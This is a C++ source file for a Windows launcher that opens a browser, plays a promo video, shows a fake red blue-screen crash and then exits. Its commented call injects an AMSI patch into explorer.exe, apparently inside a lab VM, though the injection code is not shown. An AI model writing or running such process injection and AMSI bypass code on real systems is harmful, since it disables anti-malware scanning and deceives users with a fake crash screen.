// language: C++, file: src/main.cpp — launcher: браузер → видео → BSOD → выход
#include <windows.h>
#include <mfapi.h>
#include <atomic>
#include <string>
#include "browser.h"
#include "video.h"
#include "bsod.h"
#include "resource.h"
#include "inject.h"

static std::atomic<bool> g_running{true};

static DWORD WINAPI watchdog(LPVOID) {
    DWORD start = GetTickCount();
    while (!VideoEnded()) {
        Sleep(100);
        if (GetTickCount() - start > VIDEO_FALLBACK_MS) break;
    }
    StopVideoPlayer();
    ShowRedBSOD();
    Sleep(8000);
    g_running = false;
    DestroyBrowserWindow();
    ExitProcess(0);
    return 0;
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    HANDLE mtx = CreateMutexW(nullptr, TRUE, L"LabVmBrowserMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    if (FAILED(CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED))) return 1;

    // AMSI-патч в explorer.exe — только внутри VM
    InjectViaAmsi(L"explorer.exe");

    if (!CreateBrowserWindow(hInst)) { CoUninitialize(); return 1; }

    // путь к promo.mp4 рядом с exe
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    wchar_t* slash = wcsrchr(exePath, L'\\');
    if (slash) *(slash + 1) = 0;
    std::wstring videoPath = exePath;
    videoPath += L"assets\\promo.mp4";
    StartVideoPlayer(videoPath.c_str());

    HANDLE th = CreateThread(nullptr, 0, watchdog, nullptr, 0, nullptr);
    if (!th) { CoUninitialize(); return 1; }

    MSG msg;
    while (g_running.load() && GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    CloseHandle(th);
    CloseHandle(mtx);
    StopVideoPlayer();
    MFShutdown();
    CoUninitialize();
    return 0;
}
